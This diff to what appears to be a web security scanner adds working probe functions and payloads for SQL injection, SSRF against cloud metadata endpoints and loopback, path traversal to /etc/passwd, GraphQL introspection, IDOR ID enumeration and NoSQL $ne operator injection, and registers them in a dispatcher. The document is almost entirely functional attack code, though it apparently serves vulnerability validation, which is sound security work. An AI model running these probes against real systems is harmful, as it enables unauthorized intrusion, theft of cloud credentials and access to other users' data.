@@ -558,6 +558,201 @@ async function pocJwtAlgNone(target: string): Promise<Omit<ValidationResult, "fi
   };
 }
 
+// ---------- advanced PoC class (SQLi / SSRF / traversal / GraphQL / IDOR / NoSQL) ----------
+
+const SQL_ERROR_HINT = /(sql syntax|mysql_fetch|ORA-\d{4,5}|pg_query|unclosed quotation|sqlite_|syntax error at or near|psycopg2|SQLSTATE|odbc\s+driver|microsoft ole db)/i;
+
+async function pocSqlInjection(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
+  const u = new URL(target);
+  const params = Array.from(u.searchParams.keys());
+  if (params.length === 0) {
+    return { verdict: "inconclusive", summary: "URL has no query parameters to fuzz. Append e.g. ?id=1 and retry.", poc: "Fuzz each query param with SQL meta-characters and boolean payloads.", steps: [] };
+  }
+  const steps: ProbeStep[] = [];
+  const findings: string[] = [];
+  for (const p of params.slice(0, 3)) {
+    const original = u.searchParams.get(p) ?? "";
+    const errUrl = new URL(u); errUrl.searchParams.set(p, `${original}'"`);
+    const sErr = await probeStep(`Error probe ?${p}=…'"`, "GET", errUrl.toString());
+    steps.push(sErr);
+    if (SQL_ERROR_HINT.test(sErr.bodySnippet)) {
+      findings.push(`${p}: SQL error leak (${sErr.bodySnippet.match(SQL_ERROR_HINT)?.[0]})`);
+      continue;
+    }
+    const trueUrl = new URL(u); trueUrl.searchParams.set(p, `${original}' AND '1'='1`);
+    const falseUrl = new URL(u); falseUrl.searchParams.set(p, `${original}' AND '1'='2`);
+    const sTrue = await probeStep(`Boolean TRUE ?${p}=…AND '1'='1`, "GET", trueUrl.toString());
+    const sFalse = await probeStep(`Boolean FALSE ?${p}=…AND '1'='2`, "GET", falseUrl.toString());
+    steps.push(sTrue, sFalse);
+    if (sTrue.status === sFalse.status && Math.abs(sTrue.bodyBytes - sFalse.bodyBytes) > 128) {
+      findings.push(`${p}: boolean pair differs (${sTrue.bodyBytes}B vs ${sFalse.bodyBytes}B)`);
+    }
+  }
+  return {
+    verdict: findings.length > 0 ? "confirmed" : "not-exploitable",
+    summary: findings.length > 0 ? `SQL injection indicators:\n${findings.join("\n")}` : "No SQL error leaks or boolean-pair divergence across probed parameters.",
+    poc: "For each query param: (a) inject '\" and grep response for DB error strings; (b) inject boolean TRUE vs FALSE payloads and diff response length.",
+    steps,
+  };
+}
+
+async function pocSsrf(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
+  const u = new URL(target);
+  const ssrfParams = ["url", "uri", "src", "source", "target", "dest", "image", "img", "file", "path", "callback", "webhook", "fetch", "load", "resource"];
+  const present = ssrfParams.filter((p) => u.searchParams.has(p));
+  if (present.length === 0) {
+    return { verdict: "inconclusive", summary: `URL exposes no SSRF-shaped param. Try appending one of: ${ssrfParams.slice(0, 6).join(", ")}.`, poc: "Point known fetch-shaped params at internal metadata endpoints and inspect response.", steps: [] };
+  }
+  const steps: ProbeStep[] = [];
+  const hits: string[] = [];
+  const canaries = [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://127.0.0.1:22/",
+    "file:///etc/passwd",
+  ];
+  for (const p of present.slice(0, 2)) {
+    for (const c of canaries) {
+      const test = new URL(u); test.searchParams.set(p, c);
+      const s = await probeStep(`SSRF ?${p}=${c}`, "GET", test.toString());
+      steps.push(s);
+      const body = s.bodySnippet.toLowerCase();
+      if (body.includes("ami-id") || body.includes("instance-id") || body.includes("computemetadata") || body.includes("root:x:0:0") || body.includes("ssh-")) {
+        hits.push(`${p} → ${c} leaked internal content (${s.bodyBytes}B)`);
+      } else if (s.status && s.status >= 200 && s.status < 300 && s.bodyBytes > 0 && c.startsWith("http://127.")) {
+        hits.push(`${p} → ${c} returned ${s.status} (${s.bodyBytes}B) — server reached loopback.`);
+      }
+    }
+  }
+  return {
+    verdict: hits.length > 0 ? "confirmed" : "not-exploitable",
+    summary: hits.length > 0 ? `SSRF indicators:\n${hits.join("\n")}` : "No canary response contained cloud-metadata / /etc/passwd markers, and loopback probes did not succeed.",
+    poc: "Point SSRF-shaped params (url/src/target/…) at cloud metadata endpoints (169.254.169.254, metadata.google.internal), 127.0.0.1, and file:// URIs; grep response for known markers.",
+    steps,
+  };
+}
+
+async function pocPathTraversal(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
+  const u = new URL(target);
+  const params = Array.from(u.searchParams.keys()).filter((p) => /file|path|page|include|template|doc|name/i.test(p));
+  const trials = params.length > 0 ? params : ["file", "path"];
+  const payloads = ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd"];
+  const steps: ProbeStep[] = [];
+  const hits: string[] = [];
+  for (const p of trials.slice(0, 2)) {
+    for (const pl of payloads) {
+      const t = new URL(u); t.searchParams.set(p, pl);
+      const s = await probeStep(`Traversal ?${p}=${pl}`, "GET", t.toString());
+      steps.push(s);
+      if (/root:x:0:0:/.test(s.bodySnippet) || /\[boot loader\]/i.test(s.bodySnippet)) {
+        hits.push(`${p}=${pl} → /etc/passwd content leaked`);
+        break;
+      }
+    }
+  }
+  return {
+    verdict: hits.length > 0 ? "confirmed" : "not-exploitable",
+    summary: hits.length > 0 ? `Path traversal confirmed:\n${hits.join("\n")}` : "No /etc/passwd or boot.ini markers observed in responses.",
+    poc: "Fuzz file/path/page/include-shaped params with encoded ../ sequences and grep response for /etc/passwd markers.",
+    steps,
+  };
+}
+
+async function pocGraphqlIntrospection(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
+  const candidates = ["/graphql", "/api/graphql", "/v1/graphql", "/query"];
+  const origin = new URL(target).origin;
+  const steps: ProbeStep[] = [];
+  const hits: string[] = [];
+  const introspection = JSON.stringify({ query: "{__schema{queryType{name} types{name kind}}}" });
+  for (const path of candidates) {
+    const url = new URL(path, origin).toString();
+    const s = await probeStep(`POST introspection ${path}`, "POST", url, {
+      body: introspection,
+      headers: { "content-type": "application/json" },
+    });
+    steps.push(s);
+    if (s.status === 200 && /"__schema"|"queryType"|"types"/i.test(s.bodySnippet)) {
+      hits.push(`${path}: introspection enabled (${s.bodyBytes}B schema returned)`);
+      break;
+    }
+  }
+  return {
+    verdict: hits.length > 0 ? "confirmed" : "not-exploitable",
+    summary: hits.length > 0 ? `GraphQL introspection enabled:\n${hits.join("\n")}` : "No GraphQL endpoint responded with an introspection schema.",
+    poc: "POST the standard __schema introspection query to /graphql (and common variants) and check for a schema in the response.",
+    steps,
+  };
+}
+
+async function pocIdorEnumeration(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
+  const u = new URL(target);
+  const pathParts = u.pathname.split("/");
+  const idxInPath = pathParts.findIndex((seg) => /^\d{1,10}$/.test(seg));
+  const numericParams = Array.from(u.searchParams.entries()).filter(([, v]) => /^\d{1,10}$/.test(v));
+  const steps: ProbeStep[] = [];
+  const observations: { key: string; status: number | null; bytes: number }[] = [];
+  const probeUrls: { key: string; url: string }[] = [];
+  if (idxInPath >= 0) {
+    const base = parseInt(pathParts[idxInPath]!, 10);
+    for (const delta of [-2, -1, 1, 2]) {
+      const clone = [...pathParts]; clone[idxInPath] = String(base + delta);
+      const test = new URL(u); test.pathname = clone.join("/");
+      probeUrls.push({ key: `path[${idxInPath}]=${base + delta}`, url: test.toString() });
+    }
+  } else if (numericParams.length > 0) {
+    const [p, v] = numericParams[0]!;
+    const base = parseInt(v, 10);
+    for (const delta of [-2, -1, 1, 2]) {
+      const test = new URL(u); test.searchParams.set(p, String(base + delta));
+      probeUrls.push({ key: `?${p}=${base + delta}`, url: test.toString() });
+    }
+  } else {
+    return { verdict: "inconclusive", summary: "URL exposes no numeric ID in path or query. IDOR enumeration needs a numeric handle.", poc: "Sweep ±N around a numeric resource ID; flag adjacent 2xx responses with distinct bodies.", steps: [] };
+  }
+  const baseline = await probeStep("Baseline", "GET", target);
+  steps.push(baseline);
+  for (const t of probeUrls) {
+    const s = await probeStep(`Adjacent ${t.key}`, "GET", t.url);
+    steps.push(s);
+    observations.push({ key: t.key, status: s.status, bytes: s.bodyBytes });
+  }
+  const distinct = observations.filter((o) => o.status && o.status >= 200 && o.status < 300 && Math.abs(o.bytes - baseline.bodyBytes) > 32);
+  return {
+    verdict: distinct.length >= 2 ? "confirmed" : "not-exploitable",
+    summary: distinct.length >= 2
+      ? `Adjacent IDs return distinct 2xx bodies:\n${distinct.map((d) => `${d.key} → ${d.status} (${d.bytes}B)`).join("\n")}\nBaseline: ${baseline.status} (${baseline.bodyBytes}B). No authorization check on this handle.`
+      : "Adjacent IDs did not return distinct authenticated content.",
+    poc: "Detect a numeric ID in the path or query, sweep ±N around it, and compare bodies to the baseline.",
+    steps,
+  };
+}
+
+async function pocNoSqlInjection(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
+  const u = new URL(target);
+  const params = Array.from(u.searchParams.keys());
+  if (params.length === 0) {
+    return { verdict: "inconclusive", summary: "URL has no query parameters to fuzz.", poc: "Inject Mongo operator payloads into query params and diff responses.", steps: [] };
+  }
+  const steps: ProbeStep[] = [];
+  const findings: string[] = [];
+  const baseline = await probeStep("Baseline", "GET", target);
+  steps.push(baseline);
+  for (const p of params.slice(0, 3)) {
+    const t = new URL(u); t.searchParams.delete(p); t.searchParams.set(`${p}[$ne]`, "nsl-poc-canary");
+    const s = await probeStep(`NoSQL ?${p}[$ne]=…`, "GET", t.toString());
+    steps.push(s);
+    if (s.status && s.status >= 200 && s.status < 300 && s.bodyBytes > baseline.bodyBytes + 256) {
+      findings.push(`${p}[$ne] returned ${s.status} with ${s.bodyBytes}B (baseline ${baseline.bodyBytes}B) — operator interpreted server-side.`);
+    }
+  }
+  return {
+    verdict: findings.length > 0 ? "confirmed" : "not-exploitable",
+    summary: findings.length > 0 ? `NoSQL operator injection indicators:\n${findings.join("\n")}` : "No parameter reacted to Mongo-style operator payloads.",
+    poc: "Replace ?p=v with ?p[$ne]=canary; if the response grows substantially, the operator is honored server-side.",
+    steps,
+  };
+}
+
 // ---------- dispatcher ----------
 
 export const POC_LIBRARY = [
@@ -575,6 +770,12 @@ export const POC_LIBRARY = [
   { id: "forwarded-user", label: "Auth bypass: X-Forwarded-User trust", active: false, desc: "Compare anonymous vs spoofed X-Forwarded-User / X-Remote-User headers." },
   { id: "original-url", label: "Auth bypass: X-Original-URL rewrite", active: false, desc: "Fetch '/' with X-Original-URL pointing at the protected path; look for ACL bypass." },
   { id: "jwt-alg-none", label: "Auth bypass: JWT alg:none", active: false, desc: "Send an unsigned JWT (alg:\"none\") asserting admin claims and compare to anonymous baseline." },
+  { id: "sql-injection", label: "SQL injection (error + boolean)", active: true, desc: "Inject '\" into each query param, then a boolean TRUE/FALSE pair; diff responses." },
+  { id: "ssrf", label: "SSRF via fetch params", active: true, desc: "Point url/src/target-shaped params at cloud metadata endpoints and loopback." },
+  { id: "path-traversal", label: "Path traversal", active: true, desc: "Encoded ../ payloads against file/path/include params; grep for /etc/passwd markers." },
+  { id: "graphql-introspection", label: "GraphQL introspection", active: false, desc: "POST __schema query to /graphql and common variants; flag if schema returned." },
+  { id: "idor", label: "IDOR numeric enumeration", active: true, desc: "Sweep ±N around a numeric ID in the path or query; flag distinct 2xx bodies." },
+  { id: "nosql-injection", label: "NoSQL operator injection", active: true, desc: "Replace ?p=v with ?p[$ne]=canary; look for response growth vs baseline." },
 ] as const;
 
 export type PocId = typeof POC_LIBRARY[number]["id"];
@@ -645,6 +846,12 @@ export const runStandalonePoc = createServerFn({ method: "POST" })
         case "forwarded-user":return wrap(false, await pocForwardedUser(data.url));
         case "original-url":  return wrap(false, await pocOriginalUrl(data.url));
         case "jwt-alg-none":  return wrap(false, await pocJwtAlgNone(data.url));
+        case "sql-injection": return wrap(true,  await pocSqlInjection(data.url));
+        case "ssrf":          return wrap(true,  await pocSsrf(data.url));
+        case "path-traversal":return wrap(true,  await pocPathTraversal(data.url));
+        case "graphql-introspection": return wrap(false, await pocGraphqlIntrospection(data.url));
+        case "idor":          return wrap(true,  await pocIdorEnumeration(data.url));
+        case "nosql-injection":return wrap(true, await pocNoSqlInjection(data.url));
         default:              return wrap(false, { verdict: "error", summary: `Unhandled PoC id`, poc: "", steps: [] });
       }
     } catch (e) {
